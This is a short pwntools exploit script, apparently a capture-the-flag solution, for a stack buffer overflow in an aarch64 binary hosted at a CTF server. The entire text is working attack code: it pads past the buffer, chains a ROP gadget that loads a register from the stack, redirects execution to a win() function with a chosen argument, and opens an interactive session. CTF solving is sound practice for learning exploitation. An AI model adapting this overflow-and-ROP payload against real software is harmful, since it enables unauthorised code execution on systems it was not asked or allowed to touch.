from pwn import*
context.arch="amd64"
context.terminal="xterm" #adjust this with ur terminal
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 useless here
nc="nc ctf.taz.tn 10012"
r=nc.split(" ")
if DEBUG==1:
    p=process(["qemu-aarch64", '-g', '1235', "./main"]) # open gdb and send this cmd : target remote localhost:1235
elif DEBUG==2:
    p=process(b)
    gdb.attach(p,""" 
    """)
else:
    p=remote(r[1],int(r[2]),ssl=False)

gadget = 0x458c38 # 0x0000000000458c38 : ldr w0, [sp, #0x1c] ; ldp x29, x30, [sp], #0x20 ; ret (w0 is the first argument for win() gadget : w0 = [sp+0x1c])
payload=b"a"*0x48+p64(gadget)+b"b"*(0x1c-8-8-4)+p64(e.sym._Z3wini)+b"a"*(8+4)+p64(0xdeadbeef) #padding + gadget+padding+win@+padding+param value

p.sendline(payload)

p.interactive()